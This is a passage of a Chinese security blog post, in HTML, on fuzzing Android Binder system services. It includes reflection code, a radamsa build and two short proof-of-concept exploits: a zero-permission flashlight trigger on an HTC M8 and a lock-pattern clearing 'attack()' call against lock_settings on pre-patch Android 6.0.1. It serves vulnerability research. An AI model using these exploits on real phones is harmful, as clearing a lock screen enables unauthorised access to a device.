HashMap&lt;String, Integer&gt; codes)</span> &#123;</span><br><span class="line">    HashMap&lt;String, List&lt;String&gt;&gt; ret = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (interfaceDescriptor == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class&lt;?&gt; cStub = Class</span><br><span class="line">                .forName(interfaceDescriptor + <span class="string">&quot;$Stub$Proxy&quot;</span>);</span><br><span class="line">        Method[] m = cStub.getDeclaredMethods();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Method method : m) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">func_code</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            List&lt;String&gt; func_parameter = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">func_name</span> <span class="operator">=</span> method.toString().split(<span class="string">&quot;\\$Stub\\$Proxy\\.&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">            func_parameter.add(func_name);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (String key : codes.keySet()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (func_name.contains(key.substring(<span class="string">&quot;TRANSACTION_&quot;</span>.length())))</span><br><span class="line">                    func_code = codes.get(key);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (func_code == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt;[] ParameterTypes = method.getParameterTypes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k=<span class="number">0</span>; k &lt; ParameterTypes.length; k++) &#123;</span><br><span class="line">                func_parameter.add(ParameterTypes[k].toString());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ret.put(Integer.toString(func_code), func_parameter);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5）Binder-调用"><a href="#5）Binder-调用" class="headerlink" title="5）Binder 调用"></a>5）Binder 调用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> IBinder <span class="title function_">getIBinder</span><span class="params">(String service)</span> &#123;</span><br><span class="line">    <span class="type">IBinder</span> <span class="variable">serviceBinder</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        serviceBinder = (IBinder) Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>)</span><br><span class="line">                .getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class).invoke(<span class="literal">null</span>, service);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> serviceBinder;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fuzz</span> <span class="params">(<span class="type">int</span> code, String Service)</span> &#123;</span><br><span class="line">    <span class="type">Parcel</span> <span class="variable">data</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line">    <span class="type">Parcel</span> <span class="variable">reply</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line"></span><br><span class="line">    <span class="type">IBinder</span> <span class="variable">serviceBinder</span> <span class="operator">=</span> BinderInfo.getIBinder(service);</span><br><span class="line">    serviceBinder.transact(code, data, reply, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的几个步骤已经全部java 代码实现，可行。</p>
<h2 id="5-实现方法的分析于比较"><a href="#5-实现方法的分析于比较" class="headerlink" title="5. 实现方法的分析于比较"></a>5. 实现方法的分析于比较</h2><p>ioctl 的方法过于底层，需要实现的代码很多，而 java 应用层的代码由于权限原因，经常会遇到没有权限的情况。<br>所以使用 Native 层的方法是合适的，在Root 的Android 机器上运行代码，可以解决权限问题。而 Java 应用层的<br>代码利用反射可以获取到每个接口的详细信息，根据获取到的信息指导 Native 层 fuzz 程序的后续变异，应该是比较理想的方法。</p>
<h2 id="6-Fuzz-数据的生成"><a href="#6-Fuzz-数据的生成" class="headerlink" title="6. Fuzz 数据的生成"></a>6. Fuzz 数据的生成</h2><p>可以考虑移植 radasma 到 Android 平台</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/anestisb/radamsa-android.git</span><br><span class="line">$ cd radamsa-android</span><br><span class="line">$ export PATH=$PATH:NDK_PATH</span><br><span class="line">$ ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./jni/Android.mk \</span><br><span class="line">    APP_PLATFORM=android-24 APP_ABI=armeabi-v7a \</span><br><span class="line">    NDK_TOOLCHAIN=arm-linux-androideabi-4.9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[armeabi-v7a] Compile thumb  : radamsa &lt;= radamsa.c</span><br><span class="line">[armeabi-v7a] Executable     : radamsa</span><br><span class="line">[armeabi-v7a] Install        : radamsa =&gt; libs/armeabi-v7a/radamsa</span><br></pre></td></tr></table></figure>

<h3 id="6-1-更新-radamsa-android"><a href="#6-1-更新-radamsa-android" class="headerlink" title="6.1 更新 radamsa-android"></a>6.1 更新 radamsa-android</h3><p>github 上移植的radamsa 已经比较古老 (0.4), 可以直接将最新版(0.6a)的radamsa 移植<br>到 Android上。方法比较简单，在原始的 radamsa 中有一个 radamsa.c 将这个文件替换<br>radamsa-android&#x2F;jni 目录下的 radamsa.c</p>
<p>然后在文件中添加下面代码， 重新编译即可：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ANDROID</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> WIFCONTINUED</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WIFCONTINUED(stat) 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h2 id="7-Fuzz-出来的一些漏洞"><a href="#7-Fuzz-出来的一些漏洞" class="headerlink" title="7. Fuzz 出来的一些漏洞"></a>7. Fuzz 出来的一些漏洞</h2><h3 id="1）-htc-m8-零权限打开闪光灯"><a href="#1）-htc-m8-零权限打开闪光灯" class="headerlink" title="1） htc m8 零权限打开闪光灯"></a>1） htc m8 零权限打开闪光灯</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IBinder</span> <span class="variable">serviceBinder</span> <span class="operator">=</span> getIBinder(<span class="string">&quot;media.camera&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Parcel</span> <span class="variable">data1</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line"><span class="type">Parcel</span> <span class="variable">reply1</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    data1.writeInterfaceToken(serviceBinder.getInterfaceDescriptor());</span><br><span class="line">    data1.writeByteArray(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>]);</span><br><span class="line">    serviceBinder.transact(<span class="number">8</span>, data1, reply1, <span class="number">0</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2）-Android-6-0-1-MOB3OM-手势密码清除漏洞"><a href="#2）-Android-6-0-1-MOB3OM-手势密码清除漏洞" class="headerlink" title="2） Android 6.0.1 MOB3OM 手势密码清除漏洞"></a>2） Android 6.0.1 MOB3OM 手势密码清除漏洞</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">IBinder</span> <span class="variable">serviceBinder</span> <span class="operator">=</span> getIBinder(<span class="string">&quot;lock_settings&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">Parcel</span> <span class="variable">data1</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line">	<span class="type">Parcel</span> <span class="variable">reply1</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		data1.writeInterfaceToken(serviceBinder.getInterfaceDescriptor());</span><br><span class="line">		data1.writeByteArray(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">255</span>]);</span><br><span class="line">		serviceBinder.transact(<span class="number">7</span>, data1, reply1, <span class="number">0</span>);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (RemoteException e) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> IBinder <span class="title function_">getIBinder</span><span class="params">(String service)</span> &#123;</span><br><span class="line">	<span class="type">IBinder</span> <span class="variable">serviceBinder</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		serviceBinder = (IBinder) Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>)</span><br><span class="line">				.getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class).invoke(<span class="literal">null</span>, service);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (ClassCastException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> serviceBinder;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在Android 6.0.1 MOB3OM 之前的一些版本中, 未在setLockPattern 中做权限检查,<br>导致apk 不需要任何权限就可以将手势密码清除. </p>
<p>这个问题已经修复 author Jim Miller <a href="mailto:&#106;&#x61;&#x67;&#103;&#x69;&#101;&#x73;&#x40;&#103;&#111;&#x6f;&#x67;&#108;&#x65;&#46;&#99;&#x6f;&#109;">&#106;&#x61;&#x67;&#103;&#x69;&#101;&#x73;&#x40;&#103;&#111;&#x6f;&#x67;&#108;&#x65;&#46;&#99;&#x6f;&#109;</a>	Wed Apr 13 16:35:36 2016 -0700</p>
<p><a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0">https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0</a></p>
<p>但是考虑到Android 的碎片化问题, 估计在一些手机中将存在这个问题. </p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-15/materials/us-15-Gong-Fuzzing-Android-System-Services-By-Binder-Call-To-Escalate-Privilege.pdf">Fuzzing Android System Services by Binder Call to Escalate Privilege</a></li>
<li><a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2016/12/bitunmap-attacking-android-ashmem.html">BitUnmap: Attacking Android Ashmem</a></li>
<li><a target="_blank" rel="noopener" href="http://newandroidbook.com/files/Andevcon-Binder.pdf">Android’s Binder – in depth</a></li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://usmacd.com">henices</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://usmacd.com/cn/Android_binder_fuzzing/">https://usmacd.com/cn/Android_binder_fuzzing/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://usmacd.com" target="_blank">安全代码</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Security/">Security</a><a class="post-meta__tags" href="/tags/Android/">Android</a></div><div class="post-share"><div class="social-share" data-image="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/cn/android_intent_base_attack/" title="Intent Spoofing 攻击"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Intent Spoofing 攻击</div></div><div class="info-2"><div class="info-item-1">0. Android的安全模型 application sandbox selinux permissions application signing  正是因为Application sandbox的存在，App进程之间是相互隔离的。有下面一个场景一个App需要调用weixin来分享内容，如何处理？这就需要用到intent，告诉Android系统你的意图是什么，Android系统将调用相应的处理程序来处理。 Intent 是一个将要执行的动作的抽象的描述，一般来说是作为参数来使用，由Intent来协助完成android各个组件之间的通讯。比如说调用startActivity()来启动一个activity,或者由broadcaseIntent()来传递给所有感兴趣的BroadcaseReceiver, 再或者由startService()&#x2F;bindservice()来启动一个后台的service.所以可以看出来，intent主要是用来启动其他的activity 或者service，所以可以将intent理解成activity之间的粘合剂。 1. IntentIntent...</div></div></div></a><a class="pagination-related" href="/cn/afl/" title="afl-fuzz 框架"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">afl-fuzz 框架</div></div><div class="info-2"><div class="info-item-1">afl-fuzz 的整体架构，新手理解起来还是比较费劲，网络上发现一张图觉得不错，放上来大家看看，感谢原作者。  </div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/cn/Android_SSL_Pinning/" title="Andorid 绕过 SSL Pinning 抓 https 报文"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-06</div><div class="info-item-2">Andorid 绕过 SSL Pinning 抓 https 报文</div></div><div class="info-2"><div class="info-item-1">SSL pinningSSL Pinning是一种防止中间人攻击的技术，主要机制是在客户端发起请求–&gt;收到服务器发来的证书进行校验，如果收到的证书不被客户端信任，就直接断开连接不继续请求。可以发现中间人攻击的要点是伪造了一个假的服务端证书给了客户端，客户端误以为真。解决思路就是，客户端也预置一份服务端的证书，比较一下就知道真假了。 SSL-pinning有两种方式：证书锁定（Certificate Pinning） 和公钥锁定（ Public Key Pinning）。 证书锁定需要在客户端代码内置仅接受指定域名的证书，而不接受操作系统或浏览器内置的CA根证书对应的任何证书，通过这种授权方式，保障了APP与服务端通信的唯一性和安全性，因此客户端与服务端（例如API网关）之间的通信是可以保证绝对安全。但是CA签发证书都存在有效期问题，缺点是在证书续期后需要将证书重新内置到APP中。 公钥锁定提取证书中的公钥并内置到客户端中，通过与服务器对比公钥值来验证连接的正确性。制作证书密钥时，公钥在证书的续期前后都可以保持不变（即密钥对不变），所以可以避免证书有效期问题，一般推荐这种做法...</div></div></div></a><a class="pagination-related" href="/cn/android_malware/" title="关于恶意 Android 软件的那些事"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2018-06-05</div><div class="info-item-2">关于恶意 Android 软件的那些事</div></div><div class="info-2"><div class="info-item-1">  近年来，Android手机平台上的恶意App呈不断上升的趋势，根据G DATA的数据仅2015年 第一季度发现了440267 种新的安卓恶意软件，也就是说，全球范围内每18秒就有一个新的恶意软件被发现。而天朝由于Google被封的原因，更是使恶意软件的传播更加猖獗。Google Play store 为了保证Android用户的安全做了大量的努力，和国内的一些第三方应用市场相比安全一些的。    重打包是Android App主流的传播方式之一，和以前单独的恶意App不同，重打包的软件 在合法正常的App中插入恶意代码，迷惑性极强，一般用户觉察不出什么不同。而重打包选取 的App也大多是非常流行的App，如愤怒的小鸟之类,这些都在地下市场隐秘的进行着。重打包 App然后上传第三方App应用市场，第三方市场把关不严格的话，这些插入了恶意代码的App 就可以下载安装了。   除了重打包软件，彩信也是Android 恶意App传播的主要方式，和以前QQ的消息尾巴类似发一些奇怪的话，后面加上短链接。短链接就是经过压缩的链接，没法一些看出原始的链接，点击后会自动下载恶意App。臭名昭著...</div></div></div></a><a class="pagination-related" href="/cn/android_intent_base_attack/" title="Intent Spoofing 攻击"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-06</div><div class="info-item-2">Intent Spoofing 攻击</div></div><div class="info-2"><div class="info-item-1">0. Android的安全模型 application sandbox selinux permissions application signing  正是因为Application sandbox的存在，App进程之间是相互隔离的。有下面一个场景一个App需要调用weixin来分享内容，如何处理？这就需要用到intent，告诉Android系统你的意图是什么，Android系统将调用相应的处理程序来处理。 Intent 是一个将要执行的动作的抽象的描述，一般来说是作为参数来使用，由Intent来协助完成android各个组件之间的通讯。比如说调用startActivity()来启动一个activity,或者由broadcaseIntent()来传递给所有感兴趣的BroadcaseReceiver, 再或者由startService()&#x2F;bindservice()来启动一个后台的service.所以可以看出来，intent主要是用来启动其他的activity 或者service，所以可以将intent理解成activity之间的粘合剂。 1. IntentIntent...</div></div></div></a><a class="pagination-related" href="/cn/disable_security_flags/" title="恢复 Android App 的截屏功能"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-06</div><div class="info-item-2">恢复 Android App 的截屏功能</div></div><div class="info-2"><div class="info-item-1">今天遇上某 App 禁止截屏，其实就是使用了下面这段代码 1getWindow().setFlags(LayoutParams.FLAG_SECURE, LayoutParams.FLAG_SECURE);   使用 frida 脚本可以绕过绕过这个限制 （使用 frida 需要将手机 root）。 12345678910111213Java.perform(function () &#123;   // https://developer.android.com/reference/android/view/WindowManager.LayoutParams.html#FLAG_SECURE   var FLAG_SECURE = 0x2000;   var Window = Java.use(&quot;android.view.Window&quot;);   var setFlags = Window.setFlags;  //.overload(&quot;int&quot;, &quot;int&quot;)   setFlags.implementation = ...</div></div></div></a><a class="pagination-related" href="/cn/webview_java/" title="Android WebView 漏洞"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-06</div><div class="info-item-2">Android WebView 漏洞</div></div><div class="info-2"><div class="info-item-1">☆ 来自 developer.android.com 的信息Android 官方网站对addJavascriptInterface的介绍如下： 123456789101112public void addJavascriptInterface (Object object, String name)  Added in API level 1Injects the supplied Java object into this WebView. The object is injected intothe JavaScript context of the main frame, using the supplied name. This allows the Java object&#x27;s methods to be accessed from JavaScript. For applicationstargeted to API level JELLY_BEAN_MR1 and above, only public methods that are annotated w...</div></div></div></a><a class="pagination-related" href="/cn/5cAcessPath/" title="N 谈 %5C 暴库"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2006-07-13</div><div class="info-item-2">N 谈 %5C 暴库</div></div><div class="info-2"><div class="info-item-1">关于%5c的暴库利用想已经不是什么新技术了，原因我只找到含糊的说法：的UNICODE是%5c当提交时,IIS无法正常解析,导致暴库。但我对 http://www.hoky.org 测试成功后（现在已经补上）问过hoky.pro，得知%5c与IIS的设置是有关系的。而在默认设置下是可以暴库的。还有很多人说不成功，我要说的三点：  一般的错误返回页面是本地IE提供的,所以我们先得关了本地的错误页面,具体在菜单项的‘工具-&gt;internet选项-&gt;高级-&gt;显示友好信息’。 对方数据库要是Access型。 %5c的暴库需要的是二级目录，一级目录无法成功。如：  http://www.sometips.com%5c1.asp?id=1 不成功http://www.sometips.com/other%5c1.asp?id=1 成功 好了，上面说的大家都知道，当是废话。在暴库这么好用的东西下，如果一个网站只有一级目录的话，难道就没有办法了吗？说到重点，其实一级目录我们也同样可以成功的，我们可以通过构造一个多级目录来达到暴库的目的。 http://www.target.com...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">henices</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">166</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/about"><div class="headline">关于</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="/rss.xml" target="_blank" title="RSS"><i class="fas fa-rss" style="color: #4c566a;"></i></a><a class="social-icon" href="https://x.com/henices" target="_blank" title="Twitter"><i class="fab fa-x-twitter" style="color: #4c566a;"></i></a><a class="social-icon" href="mailto:zhouzhenster@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4c566a;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-binder-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">1. binder 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Binder-%E6%9E%B6%E6%9E%84"><span class="toc-number">2.</span> <span class="toc-text">2. Binder 架构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81-fuzz-binder"><span class="toc-number">3.</span> <span class="toc-text">3. 为什么要 fuzz binder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%AE%9E%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">4. 实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8-ioctl"><span class="toc-number">4.1.</span> <span class="toc-text">4.1  直接调用 ioctl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-Native-%E5%B1%82"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 Native 层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-Java-%E5%BA%94%E7%94%A8%E5%B1%82"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 Java 应用层</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E8%BF%90%E8%A1%8C%E7%9A%84services"><span class="toc-number">4.3.1.</span> <span class="toc-text">1) 获取所有运行的services</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%8E%B7%E5%BE%97%E5%AF%B9%E5%BA%94%E6%9C%8D%E5%8A%A1%E7%9A%84IBinder-%E5%AF%B9%E8%B1%A1"><span class="toc-number">4.3.2.</span> <span class="toc-text">2) 获得对应服务的IBinder 对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E8%8E%B7%E5%8F%96%E5%AF%B9%E5%BA%94%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%89%80%E6%9C%89code"><span class="toc-number">4.3.3.</span> <span class="toc-text">3) 利用反射获取对应接口的所有code</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E8%8E%B7%E5%8F%96%E5%AF%B9%E5%BA%94%E6%8E%A5%E5%8F%A3%E6%89%80%E6%9C%89%E8%B0%83%E7%94%A8%E7%9A%84%E5%8F%82%E6%95%B0%E7%B1%BB%E5%9E%8B"><span class="toc-number">4.3.4.</span> <span class="toc-text">4) 利用反射获取对应接口所有调用的参数类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%EF%BC%89Binder-%E8%B0%83%E7%94%A8"><span class="toc-number">4.3.5.</span> <span class="toc-text">5）Binder 调用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%86%E6%9E%90%E4%BA%8E%E6%AF%94%E8%BE%83"><span class="toc-number">5.</span> <span class="toc-text">5. 实现方法的分析于比较</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-Fuzz-%E6%95%B0%E6%8D%AE%E7%9A%84%E7%94%9F%E6%88%90"><span class="toc-number">6.</span> <span class="toc-text">6. Fuzz 数据的生成</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E6%9B%B4%E6%96%B0-radamsa-android"><span class="toc-number">6.1.</span> <span class="toc-text">6.1 更新 radamsa-android</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-Fuzz-%E5%87%BA%E6%9D%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.</span> <span class="toc-text">7. Fuzz 出来的一些漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%89-htc-m8-%E9%9B%B6%E6%9D%83%E9%99%90%E6%89%93%E5%BC%80%E9%97%AA%E5%85%89%E7%81%AF"><span class="toc-number">7.1.</span> <span class="toc-text">1） htc m8 零权限打开闪光灯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%89-Android-6-0-1-MOB3OM-%E6%89%8B%E5%8A%BF%E5%AF%86%E7%A0%81%E6%B8%85%E9%99%A4%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.2.</span> <span class="toc-text">2） Android 6.0.1 MOB3OM 